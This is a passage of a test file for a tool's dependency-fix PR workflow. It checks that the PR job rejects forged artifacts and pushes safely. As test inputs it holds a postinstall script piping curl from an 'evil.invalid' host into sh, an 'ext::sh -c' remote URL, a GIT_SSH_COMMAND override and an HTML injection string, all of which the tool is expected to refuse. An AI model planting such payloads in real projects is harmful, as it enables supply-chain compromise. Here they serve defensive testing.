// The scheduled workflow's two jobs (packages/cli/src/security/deliver.ts): the validation job packs the applied fixes,
// and the PR job opens one PR per fix only after the artifact passes every check. Each refusal below is an artifact the
// validation job would not write, and nothing is pushed or opened for it.
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { fixBranch, gitBase } from "../src/security/branch.ts";
import { BUNDLE_LIMIT, checkArtifact, contentProblem, openFixes, packFixes, packagistRelease, pullRequestBody, pushInvocation, type CheckedFix } from "../src/security/deliver.ts";
import { changedManifest } from "../src/security/inventory.ts";
import type { Judgement } from "../src/security/judge.ts";
import { snapshot } from "../src/security/project.ts";
import { commit, git } from "./git.ts";

const ID = "0f1e2d3c-4b5a-4968-8776-655443322110";
const sha256 = (text: string) => createHash("sha256").update(text).digest("hex");
const PKG = "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"4.17.20\"}}\n";
const PKG_FIXED = "{\n  \"name\": \"app\",\n  \"dependencies\": {\n    \"lodash\": \"4.17.21\"\n  }\n}\n";
const LOCK = "{\n  \"name\": \"app\",\n  \"lockfileVersion\": 3,\n  \"packages\": { \"node_modules/lodash\": { \"version\": \"4.17.20\" } }\n}\n";
const FIXED = LOCK.replace("4.17.20", "4.17.21");
const SUBJECT = "ludion: lodash 4.17.20 -> 4.17.21 (npm)";
const BRANCH = "ludion/npm/lodash-4.17.21";
/** The message dependency-patch.ts writes for the fixture's fix. */
const message = (base: string, subject = SUBJECT, extra = "") => `${subject}\n\nFixes GHSA-35jh-r3h4-6jhm, CVE-2021-23337.\n\nLudion receipt ${ID}: the project's test passed on ${base.slice(0, 12)} and on this change alone, offline in Docker.\nSource dependency files only; production was not changed.\n${extra}`;
const READY = async () => ({ verdict: "ready_except_build", findings: [] }) as unknown as Judgement;

/** A project (npm policy) with two commits, and an origin it was pushed to. `base` is the second commit. */
function project() {
  const work = mkdtempSync(join(tmpdir(), "ludion-deliver-work-"));
  writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, ecosystem: "npm", image: "node:24-slim", test: ["npm", "test"], timeout_seconds: 60 })}\n`);
  writeFileSync(join(work, "package.json"), PKG);
  writeFileSync(join(work, "package-lock.json"), LOCK);
  writeFileSync(join(work, "README.md"), "app\n");
  const first = commit(work);
  writeFileSync(join(work, "README.md"), "app, second\n");
  const base = commit(work);
  git(work, "branch", "-M", "main");
  const origin = mkdtempSync(join(tmpdir(), "ludion-deliver-origin-"));
  git(origin, "init", "-q", "--bare");
  git(work, "push", "-q", origin, "main:refs/heads/main");
  return { work, origin, first, base };
}

/** The fix branch as `patch --apply` makes it (branch.ts), and the receipt that names it. */
function applied(work: string) {
  const copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
  snapshot(work, copy);
  const base = gitBase(work, copy);
  const made = fixBranch(base, BRANCH, [{ path: "package.json", content: PKG_FIXED }, { path: "package-lock.json", content: FIXED }], message(base.commit));
  return { commit: made, receipt: receiptFor(base.commit, made) };
}
function receiptFor(base: string, made: string, lock = FIXED, pkg = PKG_FIXED): Record<string, unknown> {
  return {
    schema: 2, id: ID, ecosystem: "npm", scope: "dependency_files_only_not_deployed", outcome: "partial", baseline_passed: true, base_commit: base,
    fixes: [
      {
        package: "lodash", changes: [{ name: "lodash", from: "4.17.20", to: "4.17.21", advisories: ["GHSA-35jh-r3h4-6jhm", "CVE-2021-23337"] }],
        outcome: "applied", branch: BRANCH, commit: made, candidate_passed: true,
        files: [{ path: "package.json", before_hash: sha256(PKG), after_hash: sha256(pkg) }, { path: "package-lock.json", before_hash: sha256(LOCK), after_hash: sha256(lock) }],
        fix_published_at: "2021-02-20T15:42:16.891Z", fix_published_note: "registry", found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z",
        judgement: { verdict: "ready_except_build" },
      },
      { package: "minimist", changes: [{ name: "minimist", from: "1.2.5", to: "1.2.6", advisories: ["GHSA-xvch-5gv4-984h"] }], outcome: "failed", branch: null, commit: null, candidate_passed: false, files: [], reason: "The judge's wait is not over" },
    ],
  };
}

/** An artifact as `deliver pack` writes it, from any receipt and any refs of `work` (to forge one). */
function artifact(work: string, receipt: unknown, refs: string[], base: string): string {
  const out = mkdtempSync(join(tmpdir(), "ludion-deliver-artifact-"));
  writeFileSync(join(out, "receipt.json"), `${JSON.stringify(receipt)}\n`);
  if (refs.length) git(work, "bundle", "create", "-q", join(out, "fixes.bundle"), ...refs, `^${base}`);
  return out;
}
/** The PR job's checkout as actions/checkout makes it: depth 1, at the base, HEAD detached, no fix branch. */
function checkout(origin: string): string {
  const dir = mkdtempSync(join(tmpdir(), "ludion-deliver-pr-"));
  git(dir, "clone", "-q", "--depth", "1", `file://${origin}`, ".");
  git(dir, "checkout", "-q", "--detach");
  return dir;
}

/** A commit made by hand in `work`: any parent, files (the fix's two by default), file mode, author and message. */
function forge(work: string, branch: string, parent: string, files: Record<string, string>, options: { mode?: string; author?: string; subject?: string; base?: string; extra?: string; date?: string } = {}): string {
  const index = join(mkdtempSync(join(tmpdir(), "ludion-deliver-index-")), "index");
  const env = { ...process.env, GIT_INDEX_FILE: index, GIT_AUTHOR_NAME: options.author ?? "Ludion", GIT_AUTHOR_EMAIL: "ludion@ludion.invalid", GIT_COMMITTER_NAME: "Ludion", GIT_COMMITTER_EMAIL: "ludion@ludion.invalid", ...(options.date ? { GIT_AUTHOR_DATE: options.date, GIT_COMMITTER_DATE: options.date } : {}) };
  const run = (args: string[], input?: string) => {
    const r = spawnSync("git", args, { cwd: work, env, input, encoding: "utf8" });
    if (r.status !== 0) throw new Error(r.stderr);
    return r.stdout.trim();
  };
  run(["read-tree", parent]);
  for (const [path, content] of Object.entries({ "package.json": PKG_FIXED, ...files })) run(["update-index", "--add", "--cacheinfo", options.mode ?? "100644", run(["hash-object", "-w", "--stdin"], content), path]);
  const made = run(["commit-tree", run(["write-tree"]), "-p", parent, "-F", "-"], message(options.base ?? parent, options.subject, options.extra));
  run(["update-ref", `refs/heads/${branch}`, made]);
  return made;
}

/** A stand-in for GitHub's API: the repository, PRs by head branch, branches and commits read from the origin, new PRs. */
function github(origin: string, pulls: { number: number; state: string; head: { ref: string } }[] = [], options: { refuse?: boolean } = {}) {
  const calls: string[] = [], opened: Record<string, unknown>[] = [];
  const reply = (status: number, body: unknown) => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
  const read = (args: string[]) => spawnSync("git", args, { cwd: origin, encoding: "utf8" });
  const fetchFn = (async (url: string | URL | Request, init?: RequestInit) => {
    const u = new URL(String(url)), method = init?.method ?? "GET";
    calls.push(`${method} ${u.pathname}${u.search}`);
    expect(new Headers(init?.headers).get("authorization")).toBe("Bearer t0ken");
    if (u.pathname === "/repos/o/r") return reply(200, { default_branch: "main" });
    if (u.pathname === "/repos/o/r/pulls" && method === "GET") return reply(200, pulls.filter(p => `o:${p.head.ref}` === u.searchParams.get("head")));
    if (u.pathname.startsWith("/repos/o/r/git/ref/heads/")) {
      const branch = decodeURIComponent(u.pathname.slice("/repos/o/r/git/ref/heads/".length)), r = read(["rev-parse", "--verify", "--quiet", `refs/heads/${branch}`]);
      return r.status === 0 ? reply(200, { ref: `refs/heads/${branch}`, object: { sha: r.stdout.trim() } }) : reply(404, { message: "Not Found" });
    }
    if (u.pathname.startsWith("/repos/o/r/git/commits/")) {
      const r = read(["log", "-1", "--format=%T %P", u.pathname.slice("/repos/o/r/git/commits/".length)]);
      if (r.status !== 0) return reply(404, { message: "Not Found" });
      const [tree, ...parents] = r.stdout.trim().split(" ");
      return reply(200, { tree: { sha: tree }, parents: parents.map(sha => ({ sha })) });
    }
    if (u.pathname === "/repos/o/r/pulls" && method === "POST") {
      if (options.refuse) return reply(403, { message: "GitHub Actions is not permitted to create or approve pull requests." });
      const body = JSON.parse(String(init?.body));
      opened.push(body);
      const pr = { number: 100 + pulls.length, state: "open", head: { ref: body.head } };
      pulls.push(pr);
      return reply(201, { number: pr.number, html_url: `https://github.com/o/r/pull/${pr.number}` });
    }
    return reply(404, { message: "Not Found" });
  }) as typeof fetch;
  return { fetchFn, calls, opened, pulls };
}
const open = (dir: string, out: string, base: string, origin: string, gh: ReturnType<typeof github>, ref = "refs/heads/main", extra: Partial<Parameters<typeof openFixes>[0]> = {}) =>
  openFixes({ dir, artifact: out, base, repo: "o/r", ref, api: "https://api.github.invalid", remote: origin, token: "t0ken", fetchFn: gh.fetchFn, judgeNpm: READY, osv: async () => [], ...extra });
const branchAt = (origin: string, branch: string) => spawnSync("git", ["rev-parse", "--verify", "--quiet", `refs/heads/${branch}`], { cwd: origin, encoding: "utf8" }).stdout.trim();

describe("the validation job packs the applied fixes", { timeout: 30_000 }, () => {
  it("writes the receipt and a bundle of exactly the applied fixes' branches, on the base", () => {
    const { work, base } = project(), fix = applied(work);
    const result = join(mkdtempSync(join(tmpdir(), "ludion-deliver-result-")), "patch.json");
    writeFileSync(result, JSON.stringify({ receipt: fix.receipt, path: "x", scan: {} }));
    const out = join(mkdtempSync(join(tmpdir(), "ludion-deliver-out-")), "fixes");
    expect(packFixes(work, result, out)).toEqual({ fixes: 1 });
    expect(JSON.parse(readFileSync(join(out, "receipt.json"), "utf8"))).toEqual(fix.receipt);
    expect(git(work, "bundle", "list-heads", join(out, "fixes.bundle"))).toBe(`${fix.commit} refs/heads/${BRANCH}`);
    expect(git(work, "bundle", "verify", join(out, "fixes.bundle"))).toContain(base);
  });
  it("packs no bundle when nothing was applied, and refuses a branch the receipt does not match", () => {
    const { work } = project(), fix = applied(work), dir = mkdtempSync(join(tmpdir(), "ludion-deliver-result-"));
    writeFileSync(join(dir, "none.json"), JSON.stringify({ receipt: null, path: null, scan: {} }));
    expect(packFixes(work, join(dir, "none.json"), join(dir, "a"))).toEqual({ fixes: 0 });
    expect(readFileSync(join(dir, "a", "receipt.json"), "utf8")).toBe("null\n");
    const wrong = receiptFor(fix.receipt.base_commit as string, "a".repeat(40));
    writeFileSync(join(dir, "wrong.json"), JSON.stringify({ receipt: wrong }));
    expect(() => packFixes(work, join(dir, "wrong.json"), join(dir, "b"))).toThrow("is not at the receipt's commit");
  });
});

describe("the PR job opens one PR per fix", { timeout: 30_000 }, () => {
  it("pushes the checked commit to its branch and opens one PR; the next run opens none", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base), dir = checkout(origin), gh = github(origin);
    const first = await open(dir, out, base, origin, gh);
    expect(first.deliveries).toEqual([{ package: "lodash", branch: BRANCH, outcome: "opened", pr: 100, url: "https://github.com/o/r/pull/100" }]);
    expect(first.checked.notApplied).toEqual({ failed: 1 });
    expect(branchAt(origin, BRANCH)).toBe(fix.commit);
    expect(gh.opened).toHaveLength(1);
    expect(gh.opened[0]).toMatchObject({ title: SUBJECT, head: BRANCH, base: "main", maintainer_can_modify: false });
    const body = String(gh.opened[0]!.body);
    for (const part of ["`lodash` (npm)", "`4.17.20` → `4.17.21`", "`GHSA-35jh-r3h4-6jhm`, `CVE-2021-23337`", "`2021-02-20T15:42:16.891Z`", "`2026-10-30T01:00:00.000Z`", "`2026-10-30T01:05:00.000Z`", `\`${ID}\``, "`ready_except_build`", "in both jobs", "not all four gates", "Ludion does not merge this PR"]) expect(body).toContain(part);
    expect(body).not.toMatch(/passed the four gates|minimist/);
    // The next scheduled run validates the same fix again; its PR is open, so nothing is pushed or opened.
    const again = await open(checkout(origin), out, base, origin, gh);
    expect(again.deliveries).toEqual([{ package: "lodash", branch: BRANCH, outcome: "open_pr_exists", pr: 100 }]);
    expect(gh.opened).toHaveLength(1);
    expect(gh.calls.filter(c => c.startsWith("POST"))).toHaveLength(1);
  });
  it("does not open a fix again whose PR was closed, nor move a branch that holds another change", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    const closed = github(origin, [{ number: 7, state: "closed", head: { ref: BRANCH } }]);
    expect((await open(checkout(origin), out, base, origin, closed)).deliveries).toEqual([{ package: "lodash", branch: BRANCH, outcome: "closed_pr_exists", pr: 7, reason: "A PR from this branch was closed; it is not opened again." }]);
    expect(closed.opened).toHaveLength(0);
    expect(branchAt(origin, BRANCH)).toBe("");
    // The branch exists on GitHub at another commit (here the base itself): it is left alone, no PR, and the fix fails.
    git(work, "push", "-q", origin, `${base}:refs/heads/${BRANCH}`);
    const gh = github(origin), result = await open(checkout(origin), out, base, origin, gh);
    expect(result.deliveries[0]).toMatchObject({ outcome: "branch_differs", reason: expect.stringContaining("delete it, and the next run pushes this fix") });
    expect(branchAt(origin, BRANCH)).toBe(base);
    expect(gh.opened).toHaveLength(0);
    // On the same base, with another change (a lockfile that is not this fix's): also left alone, no PR.
    const other = forge(work, "ludion/other", base, { "package-lock.json": FIXED.replace("\"app\"", "\"other\"") });
    git(work, "push", "-q", origin, `${other}:refs/heads/ludion/other`);
    git(origin, "update-ref", `refs/heads/${BRANCH}`, other);
    const gh2 = github(origin), sameBase = await open(checkout(origin), out, base, origin, gh2);
    expect(sameBase.deliveries[0]).toMatchObject({ outcome: "branch_differs" });
    expect(branchAt(origin, BRANCH)).toBe(other);
    expect(gh2.opened).toHaveLength(0);
  });
  it("after a PR GitHub would not open, the next run opens it from the branch an earlier run pushed", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    // Run 1: pushed, and GitHub refuses the PR (Actions may not open PRs in this repository).
    const refusing = github(origin, [], { refuse: true });
    const first = await open(checkout(origin), out, base, origin, refusing);
    expect(first.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("the next run opens the PR from it") });
    expect(branchAt(origin, BRANCH)).toBe(fix.commit);
    // Run 2 validated the same fix again, so its commit differs (another time); the branch on GitHub has the same tree on
    // the same base, so the PR is opened from it, without a push.
    const later = forge(work, BRANCH, base, { "package-lock.json": FIXED }, { date: "2030-01-01T00:00:00Z" });
    expect(later).not.toBe(fix.commit);
    expect(git(work, "rev-parse", `${later}^{tree}`)).toBe(git(work, "rev-parse", `${fix.commit}^{tree}`));
    const out2 = artifact(work, receiptFor(base, later), [`refs/heads/${BRANCH}`], base);
    const pushes: string[] = [], gh = github(origin);
    const result = await open(checkout(origin), out2, base, origin, gh, "refs/heads/main", { push: (_t, _r, c) => { pushes.push(c); } });
    expect(result.deliveries[0]).toMatchObject({ outcome: "opened" });
    expect(pushes).toEqual([]);
    expect(branchAt(origin, BRANCH)).toBe(fix.commit);
  });
  it("opens the PR without pushing when the branch is already at the fix's commit, and a failed push stops only that fix", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    git(work, "push", "-q", origin, `${fix.commit}:refs/heads/${BRANCH}`);
    const pushes: string[] = [], gh = github(origin);
    const result = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { push: (_t, _r, c) => { pushes.push(c); } });
    expect(result.deliveries[0]).toMatchObject({ outcome: "opened" });
    expect(pushes).toEqual([]);
    const fresh = project(), second = applied(fresh.work), gh2 = github(fresh.origin);
    const failing = await open(checkout(fresh.origin), artifact(fresh.work, second.receipt, [`refs/heads/${BRANCH}`], fresh.base), fresh.base, fresh.origin, gh2, "refs/heads/main", { push: () => { throw new Error("git push failed: rejected"); } });
    expect(failing.deliveries[0]).toMatchObject({ outcome: "failed", reason: "git push failed: rejected" });
    expect(gh2.opened).toHaveLength(0);
  });
  it("runs the judge again on the lockfile, and pushes nothing when it does not say ready_except_build", async () => {
    const { work, origin, base } = project(), fix = applied(work), gh = github(origin), seen: string[][] = [];
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    const stop = async (before: string, after: string) => {
      seen.push([readFileSync(join(before, "package-lock.json"), "utf8"), readFileSync(join(after, "package-lock.json"), "utf8")]);
      return { verdict: "stop", findings: [{ gate: 2, effect: "stop", message: "lodash@4.17.21 has an install script" }] } as unknown as Judgement;
    };
    const result = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { judgeNpm: stop });
    expect(seen).toEqual([[LOCK, FIXED]]);
    expect(result.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("gate 2: lodash@4.17.21 has an install script") });
    expect(branchAt(origin, BRANCH)).toBe("");
    expect(gh.opened).toHaveLength(0);
    const failing = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { judgeNpm: async () => { throw new Error("registry unreachable"); } });
    expect(failing.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("could not judge: registry unreachable") });
    expect(branchAt(origin, BRANCH)).toBe("");
  });
  it.skipIf(process.platform === "win32")("keeps a file's executable mode from the base (a checkout from a file system without modes)", async () => {
    const { work, origin } = project();
    chmodSync(join(work, "package-lock.json"), 0o755);
    git(work, "add", "package-lock.json"); git(work, "commit", "-qm", "executable"); git(work, "push", "-q", origin, "HEAD:refs/heads/main");
    const base = git(work, "rev-parse", "HEAD"), fix = applied(work), gh = github(origin);
    expect(git(work, "ls-tree", fix.commit, "package-lock.json")).toMatch(/^100755 /);
    const result = await open(checkout(origin), artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base), base, origin, gh);
    expect(result.deliveries).toMatchObject([{ outcome: "opened" }]);
  });
  it("opens nothing for a run that is not on the default branch, before reading the artifact", async () => {
    const { work, origin, base } = project(), fix = applied(work), gh = github(origin);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    await expect(open(checkout(origin), out, base, origin, gh, "refs/heads/feature")).rejects.toThrow("not on the default branch main");
    expect(gh.calls).toEqual(["GET /repos/o/r"]);
    expect(branchAt(origin, BRANCH)).toBe("");
  });
  it("pushes with a plain refspec, the token only in Git's environment, and only to a ludion/ branch", () => {
    const remote = "https://github.com/o/r.git", commit = "a".repeat(40);
    const { args, env } = pushInvocation("/top", remote, commit, BRANCH, "t0ken", "/hooks", { PATH: "/bin", GIT_DIR: "/elsewhere", GIT_SSH_COMMAND: "evil" });
    expect(args.slice(-5)).toEqual(["push", "--no-verify", "--porcelain", remote, `${commit}:refs/heads/${BRANCH}`]);
    expect(args.join(" ")).not.toMatch(/t0ken|--force|\+[0-9a-f]{40}/);
    expect(args).toEqual(expect.arrayContaining(["core.hooksPath=/hooks", "protocol.allow=never", "protocol.https.allow=always", "credential.helper="]));
    expect(env).toMatchObject({ GIT_ALLOW_PROTOCOL: "https", GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: `http.${remote}.extraheader`, GIT_CONFIG_VALUE_0: `AUTHORIZATION: basic ${Buffer.from("x-access-token:t0ken").toString("base64")}`, PATH: "/bin" });
    expect(env.GIT_DIR).toBeUndefined();
    expect(env.GIT_SSH_COMMAND).toBeUndefined();
    expect(() => pushInvocation("/top", remote, commit, "main", "t0ken", "/hooks")).toThrow("Only a fix commit goes to a ludion/ branch");
    expect(() => pushInvocation("/top", "http://github.com/o/r.git", commit, BRANCH, "t0ken", "/hooks")).toThrow("https URL or an absolute path");
    expect(() => pushInvocation("/top", "ext::sh -c x", commit, BRANCH, "t0ken", "/hooks")).toThrow("https URL or an absolute path");
  });
});

describe("the PR job refuses an artifact the validation job would not write", { timeout: 30_000 }, () => {
  /** Runs the PR job on a forged artifact: it must throw `why`, push nothing and open nothing. */
  async function refused(setup: (p: ReturnType<typeof project>) => { receipt: unknown; refs: string[]; base?: string; tamper?: (out: string) => void }, why: string | RegExp) {
    const p = project(), s = setup(p), out = artifact(p.work, s.receipt, s.refs, s.base ?? p.base);
    s.tamper?.(out);
    const gh = github(p.origin);
    await expect(open(checkout(p.origin), out, s.base ?? p.base, p.origin, gh)).rejects.toThrow(why);
    expect(gh.calls).toEqual(["GET /repos/o/r"]);
    expect(git(p.origin, "for-each-ref", "--format=%(refname)")).toBe("refs/heads/main");
  }
  it("a commit whose parent is not the base", () => refused(p => {
    const made = forge(p.work, BRANCH, p.first, { "package-lock.json": FIXED }, { base: p.base });
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, /does not have the base [0-9a-f]{12} as its only parent|needs commits other than the base/));
  it("two commits on the base, not one", () => refused(p => {
    const middle = forge(p.work, "ludion/x", p.base, { "package-lock.json": LOCK.replace("app", "app2") });
    const made = forge(p.work, BRANCH, middle, { "package-lock.json": FIXED }, { base: p.base });
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, "does not have the base"));
  it("a file outside the plan, beside the planned ones", () => refused(p => {
    const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED, "README.md": "changed\n" });
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, "not exactly package-lock.json, package.json"));
  it("a receipt that lists a file a fix may not change", async () => {
    for (const [path, why] of [["README.md", "which a npm fix may not change"], [".github/workflows/x.yml", "A file's path is missing or not in the expected form"]] as const) {
      await refused(p => {
        const made = forge(p.work, BRANCH, p.base, { [path]: "on: push\n" });
        const receipt = receiptFor(p.base, made) as { fixes: { files: unknown[] }[] };
        receipt.fixes[0]!.files = [{ path, before_hash: "0".repeat(64), after_hash: sha256("on: push\n") }];
        return { receipt, refs: [`refs/heads/${BRANCH}`] };
      }, why);
    }
  });
  it("a new file, even at a planned path", () => refused(p => {
    git(p.work, "rm", "-q", "package.json"); git(p.work, "commit", "-qm", "no package.json"); git(p.work, "push", "-q", p.origin, "HEAD:refs/heads/main");
    const base = git(p.work, "rev-parse", "HEAD"), made = forge(p.work, BRANCH, base, { "package.json": "{}\n" });
    const receipt = receiptFor(base, made) as { fixes: { files: unknown[] }[] };
    receipt.fixes[0]!.files = [{ path: "package.json", before_hash: "0".repeat(64), after_hash: sha256("{}\n") }];
    return { receipt, refs: [`refs/heads/${BRANCH}`], base };
  }, "adds, removes or changes the mode of package.json"));
  it("a changed file mode", () => refused(p => {
    const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { mode: "100755" });
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, "changes the mode of package-lock.json"));
  it("an extra branch in the bundle", () => refused(p => {
    const fix = applied(p.work);
    forge(p.work, "ludion/npm/evil-1.0.0", p.base, { "package-lock.json": FIXED });
    return { receipt: fix.receipt, refs: [`refs/heads/${BRANCH}`, "refs/heads/ludion/npm/evil-1.0.0"] };
  }, "not exactly the receipt's applied fixes"));
  it("a bundle commit other than the receipt's", () => refused(p => {
    applied(p.work);
    return { receipt: receiptFor(p.base, "b".repeat(40)), refs: [`refs/heads/${BRANCH}`] };
  }, "not exactly the receipt's applied fixes"));
  it("an applied fix with no bundle, and a bundle with no applied fix", async () => {
    await refused(p => ({ receipt: applied(p.work).receipt, refs: [] }), "there is no bundle");
    await refused(p => { applied(p.work); return { receipt: null, refs: [`refs/heads/${BRANCH}`] }; }, "it has a bundle, and the receipt applies no fix");
  });
  it("a file whose bytes are not the receipt's", () => refused(p => {
    const fix = applied(p.work);
    return { receipt: receiptFor(p.base, fix.commit, "something else"), refs: [`refs/heads/${BRANCH}`] };
  }, "is not the receipt's file (after_hash)"));
  it("a subject that is not the receipt's change, an author that is not Ludion, and a message with more in it", async () => {
    await refused(p => {
      const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { subject: "ludion: lodash 4.17.20 -> 4.17.21 (npm) @everyone" });
      return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
    }, "subject is not the receipt's change");
    await refused(p => {
      const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { author: "Mallory" });
      return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
    }, "is not authored and committed by Ludion");
    await refused(p => {
      const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { extra: "\nCloses #1\nCo-authored-by: Mallory <m@example.invalid>\n" });
      return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
    }, "message is not the one Ludion writes");
  });
  it("a package.json that says more than the fix: an install script, another dependency, a looser range", async () => {
    for (const pkg of [
      "{\"name\":\"app\",\"scripts\":{\"postinstall\":\"curl https://evil.invalid | sh\"},\"dependencies\":{\"lodash\":\"4.17.21\"}}\n",
      "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"4.17.21\",\"left-pad\":\"1.0.0\"}}\n",
      "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"*\"}}\n",
    ]) {
      await refused(p => {
        const made = forge(p.work, BRANCH, p.base, { "package.json": pkg, "package-lock.json": FIXED });
        return { receipt: receiptFor(p.base, made, FIXED, pkg), refs: [`refs/heads/${BRANCH}`] };
      }, "package.json is not what Ludion writes for lodash 4.17.21");
    }
  });
  it("a branch name that is not the one Ludion gives the receipt's fix", () => refused(p => {
    const made = forge(p.work, "ludion/npm/lodash-9.9.9", p.base, { "package-lock.json": FIXED });
    const receipt = receiptFor(p.base, made) as { fixes: { branch: string }[] };
    receipt.fixes[0]!.branch = "ludion/npm/lodash-9.9.9";
    return { receipt, refs: ["refs/heads/ludion/npm/lodash-9.9.9"] };
  }, "is not the one Ludion names for lodash"));
  it("an npm fix applied without the judge's ready_except_build, a fix whose tests did not pass, another base", async () => {
    for (const [change, why] of [
      [(f: Record<string, unknown>, _r: Record<string, unknown>) => { f.judgement = { verdict: "wait" }; }, "without the judge's ready_except_build"],
      [(f: Record<string, unknown>, _r: Record<string, unknown>) => { f.candidate_passed = false; }, "whose tests did not pass"],
      [(_f: Record<string, unknown>, r: Record<string, unknown>) => { r.base_commit = "c".repeat(40); }, "base_commit is not the commit this run checked out"],
    ] as const) {
      await refused(p => {
        const fix = applied(p.work), receipt = fix.receipt as { fixes: Record<string, unknown>[] };
        change(receipt.fixes[0]!, receipt as unknown as Record<string, unknown>);
        return { receipt, refs: [`refs/heads/${BRANCH}`] };
      }, why);
    }
  });
  it("text that could become Markdown or a mention, a receipt that is not JSON, and an oversized bundle", async () => {
    await refused(p => {
      const fix = applied(p.work), receipt = fix.receipt as { fixes: { changes: { advisories: string[] }[] }[] };
      receipt.fixes[0]!.changes[0]!.advisories = ["GHSA-x`<img src=x>`"];
      return { receipt, refs: [`refs/heads/${BRANCH}`] };
    }, "An advisory is missing or not in the expected form");
    await refused(p => ({ receipt: applied(p.work).receipt, refs: [`refs/heads/${BRANCH}`], tamper: out => writeFileSync(join(out, "receipt.json"), "{not json") }), "receipt.json is not JSON");
    await refused(p => ({ receipt: applied(p.work).receipt, refs: [`refs/heads/${BRANCH}`], tamper: out => writeFileSync(join(out, "fixes.bundle"), Buffer.alloc(BUNDLE_LIMIT + 1)) }), "fixes.bundle is larger than");
  });
  it("a checkout that is not at the base it is given", () => refused(p => ({ receipt: applied(p.work).receipt, refs: [`refs/heads/${BRANCH}`], base: p.first }), "The checkout is not at the base"));
});

const PHP_MESSAGE = (base: string) => `ludion: PHP 8.4.26 -> 8.4.27 in ./Dockerfile\n\nOfficial PHP security releases: 8.4.27.\n\nLudion receipt ${ID}: the project's test passed on ${base.slice(0, 12)} and on this change, offline in Docker.\nSource Dockerfile only; production was not changed.\n`;
/** A committed project of `files` on main, pushed to a bare origin. */
function repository(files: Record<string, string>) {
  const work = mkdtempSync(join(tmpdir(), "ludion-deliver-repo-"));
  for (const [path, content] of Object.entries(files)) writeFileSync(join(work, path), content);
  const base = commit(work);
  git(work, "branch", "-M", "main");
  const origin = mkdtempSync(join(tmpdir(), "ludion-deliver-origin-"));
  git(origin, "init", "-q", "--bare");
  git(work, "push", "-q", origin, "main:refs/heads/main");
  const copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
  snapshot(work, copy);
  return { work, origin, base, gitBase: gitBase(work, copy) };
}
const composerEntry = (name: string, version: string, ref: string, extra: Record<string, unknown> = {}) => ({ name, version, dist: { type: "zip", url: `https://api.github.com/repos/${name}/zipball/${ref}`, reference: ref, shasum: "" }, type: "library", ...extra });

describe("the PR job checks what a fix pins against the official registry", { timeout: 30_000 }, () => {
  it("PHP: the digest must be the one Docker Hub gives for the tag", async () => {
    for (const [given, outcome] of [[`sha256:${"1".repeat(64)}`, "opened"], [`sha256:${"9".repeat(64)}`, "failed"]] as const) {
      const r = repository({ "ludion.security.json": `${JSON.stringify({ schema: 1, dockerfile: "./Dockerfile", test: ["php", "t.php"], timeout_seconds: 60 })}\n`, Dockerfile: "FROM php:8.4.26-cli-alpine\nWORKDIR /app\n" });
      const after = `FROM php:8.4.27-cli-alpine@sha256:${"1".repeat(64)}\nWORKDIR /app\n`;
      const made = fixBranch(r.gitBase, "ludion/php/8.4.27", [{ path: "Dockerfile", content: after }], PHP_MESSAGE(r.base));
      const receipt = {
        schema: 1, id: ID, scope: "dockerfile_only_not_deployed", outcome: "applied", baseline_passed: true, candidate_passed: true, base_commit: r.base,
        scan: { current: { version: "8.4.26" }, candidate: { version: "8.4.27" }, security_releases: [{ version: "8.4.27" }] }, dockerfile_after: sha256(after),
        branch: "ludion/php/8.4.27", commit: made, fix_published_at: null, found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z",
      };
      const tags: string[] = [], gh = github(r.origin);
      const result = await open(checkout(r.origin), artifact(r.work, receipt, ["refs/heads/ludion/php/8.4.27"], r.base), r.base, r.origin, gh, "refs/heads/main", { phpDigest: async tag => { tags.push(tag); return given; } });
      expect(tags).toEqual(["8.4.27-cli-alpine"]);
      expect(result.deliveries[0]).toMatchObject({ outcome, ...(outcome === "failed" ? { reason: expect.stringContaining("Docker Hub gives") } : {}) });
